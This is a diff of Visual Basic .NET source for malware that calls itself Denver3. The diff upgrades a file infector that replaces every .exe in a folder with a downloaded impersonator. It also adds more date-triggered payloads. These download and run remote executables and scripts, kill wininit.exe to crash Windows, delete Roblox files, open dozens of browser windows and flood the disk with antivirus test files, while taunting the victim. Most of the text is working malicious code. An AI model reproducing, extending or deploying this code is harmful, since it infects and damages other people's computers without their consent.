@@ -5,6 +5,7 @@ Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
 Imports System.IO.Directory
+Imports System.Drawing.Imaging
 
 Public Class Form1
 
@@ -22,23 +23,19 @@ Public Class Form1
 
 
     Private Sub DebugScript() 'Code to run on debug mode
-        file_infector("C:\Users\zv800\Desktop\TESTDER")
-        ' Dim exeFilePath As String = "C:\Path\To\Your\File.exe"
+        Try
+            My.Computer.Network.DownloadFile(ServerAddr & "Red_Sun_in_the_Sky.wav", InstallPath & "\Red_Sun_in_the_Sky.wav")
+        Catch ex As Exception
 
-        ' Extract the icon from the .exe file
-        ' Dim icon As Icon = Icon.ExtractAssociatedIcon(exeFilePath)
-
-        ' Save the icon as an ICO file
-        'Dim savePath As String = "C:\Path\To\Save\Your\Icon.ico"
-        'Using fs As New FileStream(savePath, FileMode.Create)
-        ' I'con.Save(fs)
-        ' End Using
+        End Try
+        My.Computer.Audio.Play(InstallPath & "\Red_Sun_in_the_Sky.wav")
+        social_credit.Show()
     End Sub
 
     Public Sub file_infector(Path As String)
         Try
             Try
-                My.Computer.Network.DownloadFile(ServerAddr & "file_impersonator.exe", InstallPath & "\file_impersonator.exe")
+                My.Computer.Network.DownloadFile(ServerAddr & "file_impersonator_v2.exe", InstallPath & "\file_impersonator_v2.exe")
             Catch ex As Exception
 
             End Try
@@ -51,9 +48,18 @@ Public Class Form1
                 Try
                     If Not fri.Name = "Denver3.exe" Or Not fri.Name = "Denver3.exe" Then
                         If fri.Extension = ".exe" Then
-                            My.Computer.FileSystem.RenameFile(fri.FullName, fri.Name & ".Denver3.exe")
-                            IO.File.SetAttributes(fri.FullName & ".Denver3.exe", IO.FileAttributes.Hidden Or IO.FileAttributes.System)
-                            My.Computer.FileSystem.CopyFile(InstallPath & "\file_impersonator.exe", fri.FullName)
+                            Try
+                                My.Computer.FileSystem.MoveFile(fri.FullName, InstallPath & "\" & fri.Name & ".Denver3.exe")
+                            Catch ex As Exception
+
+                            End Try
+                            My.Computer.FileSystem.CopyFile(InstallPath & "\file_impersonator_v2.exe", fri.FullName)
+                            Try
+                            Catch ex As Exception
+                                MsgBox(ex, 0 + 16)
+                            End Try
+
+
                         End If
                     End If
                 Catch ex As Exception
@@ -160,417 +166,426 @@ Public Class Form1
                 End Try
             End If
 
+            If currentTime.Month = 10 And currentTime.Date.Day = 3 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "Red_Sun_in_the_Sky.wav", InstallPath & "\Red_Sun_in_the_Sky.wav")
+                Catch ex As Exception
+
+                End Try
+                My.Computer.Audio.Play(InstallPath & "\Red_Sun_in_the_Sky.wav")
+                social_credit.Show()
+            End If
 
             If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
-                RipConeehasOldAcc.Show()
-            End If
-            If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
+                    RipConeehasOldAcc.Show()
+                End If
+                If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
 
-                Trolled.Show()
-                Wait(45)
-                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
-            End If
-            If currentTime.Month = 5 And currentTime.Date.Day = 13 Then
-                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
-            End If
-            If currentTime.Month = 11 And currentTime.Date.Day = 26 Then
-                MsgBox("You have not seen my full power yet....", 0 + 64)
-                Try
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
-                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                    Process.Start("https://www.pcoptimizerpro.com/")
-                Catch ex As Exception
-
-                End Try
-            End If
-
-            If currentTime.Month = 11 And currentTime.Date.Day = 28 Then
-                MsgBox("still using this computer?", 0 + 48, "lol")
-                For i As Integer = 1 To 70
-                    Try
-                        Dim q As New still_using_this_computer()
-                        q.Show()
-                    Catch ex As Exception
-                    End Try
-                Next
-            End If
-            If currentTime.Month = 11 And currentTime.Date.Day = 8 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "NCS1.wav", InstallPath & "\NCS1.wav")
-                Catch ex As Exception
-
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\NCS1.wav")
-            End If
-            If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
-                MsgBox("Train is a furry: inside joke in my friend group (c) EEI 2024.")
-            End If
-
-            If currentTime.Month = 5 And currentTime.Date.Day = 27 Then
-                Error408.Show()
-            End If
-
-            If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
-                Dim random As New Random()
-                Dim randomNumber As Integer = random.Next(1, 21)
-                If randomNumber = 1 Then
-                    MsgBox("Fuck you", 0 + 16, "die")
+                    Trolled.Show()
+                    Wait(45)
                     MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
                 End If
-            End If
-            If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
-                GoPlayHLAlyx.Show()
-            End If
-            If currentTime.Month = 2 And currentTime.Date.Day = 3 Then
-                SetWallpaper(PIC_BILL_NYE.Image)
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "billnye.wav", InstallPath & "\billnye.wav")
-                Catch ex As Exception
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\billnye.wav", AudioPlayMode.BackgroundLoop)
-            End If
-            If currentTime.Month = 2 And currentTime.Date.Day = 7 Then
-                nuke_computer.Show()
-            End If
-
-
-            If currentTime.Month = 3 And currentTime.Date.Day = 14 Then
-                pi.Show()
-            End If
-
-
-            If currentTime.Month = 3 And currentTime.Date.Day = 1 Then
-                GoPlayHL2.Show()
-            End If
-            If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
-                FreeRobuxGen.Show()
-            End If
-
-            If currentTime.Month = 10 And currentTime.Date.Day = 20 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "AvastMeme.wav", InstallPath & "\AvastMeme.wav")
-                Catch ex As Exception
-                End Try
-                AvastMeme.Show()
-                My.Computer.Audio.Play(InstallPath & "\AvastMeme.wav", AudioPlayMode.Background)
-            End If
-            If currentTime.Month = 5 And currentTime.Date.Day = 7 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "Hoax.Win32.BadJoke.BlastBtn.a.exe", InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
-                Catch ex As Exception
-
-                End Try
-
-                Try
-                    Process.Start(InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START Hoax.Win32.BadJoke.BlastBtn.a.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-
-
-
-            If currentTime.Month = 6 And currentTime.Date.Day = 9 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
-                Catch ex As Exception
-
-                End Try
-                MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
-                Try
-                    Process.Start(InstallPath & "\WBOUNCE.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-            'CHOMP.exe
-
-
-            If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
-                Catch ex As Exception
-
-                End Try
-                MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
-                Try
-                    Process.Start(InstallPath & "\CHOMP.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    Process.Start(InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
-                End Try
-                Conewehwsqafv.Show()
-            End If
-
-            If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    Process.Start(InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-            If currentTime.Month = 4 And currentTime.Date.Day = 6 Then
-                MsgBox("Old Roblox was better! I Have Uninstalled Roblox form your pc.")
-                If My.Computer.FileSystem.DirectoryExists("C:\Users\%USERNAME%\AppData\Local\Roblox\") Then
-                    MyUtilities.RunCommandComInvis("RD C:\Users\%USERNAME%\AppData\Local\Roblox\Versions /S /Q", "", False) 'Removes Roblox
+                If currentTime.Month = 5 And currentTime.Date.Day = 13 Then
+                    MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
                 End If
-            End If
-
-            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
-                MsgBox("Sub To danooct1!!!")
-                Process.Start("https://www.youtube.com/watch?v=0CZ4I4COZEw")
-            End If
-
-            If currentTime.Month = 10 And currentTime.Date.Day = 19 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Audio.Play(InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", AudioPlayMode.BackgroundLoop)
-                Catch ex As Exception
-
-                End Try
-                IntroThing.Show()
-            End If
-
-            If currentTime.Month = 4 And currentTime.Date.Day = 20 Then
-                SetWallpaper(pic_cannabis_leaf.Image)
-            End If
-            If currentTime.Month = 7 And currentTime.Day = 6 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
-                Catch ex As Exception
-
-                End Try
-                HELL_NAH.Show()
-            End If
-            If currentTime.Month = 2 And currentTime.Day = 8 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "screen-melter.exe", InstallPath & "\screen-melter.exe")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    Process.Start(InstallPath & "\screen-melter.exe")
-                Catch ex As Exception
-                    MsgBox("FAILED TO START: screen-melter.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-            If currentTime.Month = 9 And currentTime.Date.Day = 18 Then
-                SubToEnderman.Show()
-            End If
-            If currentTime.Month = 9 And currentTime.Date.Day = 19 Then
-                SubToZeRoTeCh00.Show()
-            End If
-            If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
-
-
-            End If
-            If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
-                Catch ex As Exception
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
-            End If
-            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-                Catch ex As Exception
-
-                End Try
-
-
-                Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-            End If
-            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
-                Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
-            End If
-            If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
-                MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
-                'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
-
-
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")
-
-                Catch ex As Exception
-
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
-                MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
-                For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\SkillE.vbs")
-                Next
-            End If
-
-            If currentTime.Month = 7 And currentTime.Date.Day = 27 Then
-                Rickroll.Show()
-            End If
-            If currentTime.Month = 8 And currentTime.Date.Day = 25 Then
-                MsgBox("This is all your fault...", 0 + 64, "Denver3")
-                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
-            End If
-
-            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
-
-                Catch ex As Exception
-
-                End Try
-                MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
-                For index As Integer = 1 To 20
-                    Process.Start(InstallPath & "\SkillE.vbs")
-                Next
-            End If
-
-            If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
-                MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
-                Catch ex As Exception
-                End Try
-                For index As Integer = 1 To 30 'OverLoadAntiVirus
+                If currentTime.Month = 11 And currentTime.Date.Day = 26 Then
+                    MsgBox("You have not seen my full power yet....", 0 + 64)
                     Try
-                        My.Computer.FileSystem.CopyFile(InstallPath & "\AVTESTFILE.EXE", InstallPath & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                        Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                        Process.Start("https://www.pcoptimizerpro.com/")
+                    Catch ex As Exception
+
+                    End Try
+                End If
+
+                If currentTime.Month = 11 And currentTime.Date.Day = 28 Then
+                    MsgBox("still using this computer?", 0 + 48, "lol")
+                    For i As Integer = 1 To 70
+                        Try
+                            Dim q As New still_using_this_computer()
+                            q.Show()
+                        Catch ex As Exception
+                        End Try
+                    Next
+                End If
+                If currentTime.Month = 11 And currentTime.Date.Day = 8 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "NCS1.wav", InstallPath & "\NCS1.wav")
+                    Catch ex As Exception
+
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\NCS1.wav")
+                End If
+                If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
+                    MsgBox("Train is a furry: inside joke in my friend group (c) EEI 2024.")
+                End If
+
+                If currentTime.Month = 5 And currentTime.Date.Day = 27 Then
+                    Error408.Show()
+                End If
+
+                If currentTime.Month = 1 And currentTime.Date.Day = 2 Then
+                    Dim random As New Random()
+                    Dim randomNumber As Integer = random.Next(1, 21)
+                    If randomNumber = 1 Then
+                        MsgBox("Fuck you", 0 + 16, "die")
+                        MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
+                    End If
+                End If
+                If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
+                    GoPlayHLAlyx.Show()
+                End If
+                If currentTime.Month = 2 And currentTime.Date.Day = 3 Then
+                    SetWallpaper(PIC_BILL_NYE.Image)
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "billnye.wav", InstallPath & "\billnye.wav")
                     Catch ex As Exception
                     End Try
-                Next
-            End If
+                    My.Computer.Audio.Play(InstallPath & "\billnye.wav", AudioPlayMode.BackgroundLoop)
+                End If
+                If currentTime.Month = 2 And currentTime.Date.Day = 7 Then
+                    nuke_computer.Show()
+                End If
 
-            If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
+
+                If currentTime.Month = 3 And currentTime.Date.Day = 14 Then
+                    pi.Show()
+                End If
 
 
-            End If
-            If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
-                Catch ex As Exception
+                If currentTime.Month = 3 And currentTime.Date.Day = 1 Then
+                    GoPlayHL2.Show()
+                End If
+                If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
+                    FreeRobuxGen.Show()
+                End If
 
-                End Try
-                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
-            End If
-            If currentTime.Month = 4 And currentTime.Date.Day = 25 Then
-                MsgBox("ur worst nightmare")
-                AAAAAAA.Show()
-            End If
-            If currentTime.Month = 8 And currentTime.Date.Day = 23 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
-                Catch ex As Exception
+                If currentTime.Month = 10 And currentTime.Date.Day = 20 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "AvastMeme.wav", InstallPath & "\AvastMeme.wav")
+                    Catch ex As Exception
+                    End Try
+                    AvastMeme.Show()
+                    My.Computer.Audio.Play(InstallPath & "\AvastMeme.wav", AudioPlayMode.Background)
+                End If
+                If currentTime.Month = 5 And currentTime.Date.Day = 7 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "Hoax.Win32.BadJoke.BlastBtn.a.exe", InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                    Catch ex As Exception
 
-                End Try
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
+                    End Try
 
-                End Try
-                Try
-                    Process.Start(InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
-                End Try
-                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
-            End If
+                    Try
+                        Process.Start(InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START Hoax.Win32.BadJoke.BlastBtn.a.exe", 0 + 16, "ERROR")
+                    End Try
 
-            If currentTime.Month = 10 And currentTime.Date.Day = 2 Then
-                ScreenStuck.Show()
-            End If
-            If currentTime.Month = 4 And currentTime.Date.Day = 16 Then
-                FitTeaTimer.Start()
-            End If
-            If currentTime.Month = 6 And currentTime.Date.Day = 17 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "STILLALI.EXE.wav", InstallPath & "\STILLALI.EXE.wav")
-                Catch ex As Exception
+                End If
 
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\STILLALI.EXE.wav", AudioPlayMode.BackgroundLoop)
-            End If
-            If currentTime.Month = 11 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
-                Catch ex As Exception
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
-                MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
-            End If
 
-            If currentTime.Month = 12 And currentTime.Day = 1 Or True = False Then
-                fuckpc()
+
+                If currentTime.Month = 6 And currentTime.Date.Day = 9 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
+                    Try
+                        Process.Start(InstallPath & "\WBOUNCE.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
+                    End Try
+
+                End If
+                'CHOMP.exe
+
+
+                If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
+                    Try
+                        Process.Start(InstallPath & "\CHOMP.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
+                    End Try
+
+                End If
+                If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.Start(InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                    End Try
+                    Conewehwsqafv.Show()
+                End If
+
+                If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.Start(InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                    End Try
+
+                End If
+                If currentTime.Month = 4 And currentTime.Date.Day = 6 Then
+                    MsgBox("Old Roblox was better! I Have Uninstalled Roblox form your pc.")
+                    If My.Computer.FileSystem.DirectoryExists("C:\Users\%USERNAME%\AppData\Local\Roblox\") Then
+                        MyUtilities.RunCommandComInvis("RD C:\Users\%USERNAME%\AppData\Local\Roblox\Versions /S /Q", "", False) 'Removes Roblox
+                    End If
+                End If
+
+                If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
+                    MsgBox("Sub To danooct1!!!")
+                    Process.Start("https://www.youtube.com/watch?v=0CZ4I4COZEw")
+                End If
+
+                If currentTime.Month = 10 And currentTime.Date.Day = 19 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Audio.Play(InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", AudioPlayMode.BackgroundLoop)
+                    Catch ex As Exception
+
+                    End Try
+                    IntroThing.Show()
+                End If
+
+                If currentTime.Month = 4 And currentTime.Date.Day = 20 Then
+                    SetWallpaper(pic_cannabis_leaf.Image)
+                End If
+                If currentTime.Month = 7 And currentTime.Day = 6 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
+                    Catch ex As Exception
+
+                    End Try
+                    HELL_NAH.Show()
+                End If
+                If currentTime.Month = 2 And currentTime.Day = 8 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "screen-melter.exe", InstallPath & "\screen-melter.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.Start(InstallPath & "\screen-melter.exe")
+                    Catch ex As Exception
+                        MsgBox("FAILED TO START: screen-melter.exe", 0 + 16, "ERROR")
+                    End Try
+
+                End If
+                If currentTime.Month = 9 And currentTime.Date.Day = 18 Then
+                    SubToEnderman.Show()
+                End If
+                If currentTime.Month = 9 And currentTime.Date.Day = 19 Then
+                    SubToZeRoTeCh00.Show()
+                End If
+                If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
+
+
+                End If
+                If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
+                    Catch ex As Exception
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
+                End If
+                If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+                    Catch ex As Exception
+
+                    End Try
+
+
+                    Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+                End If
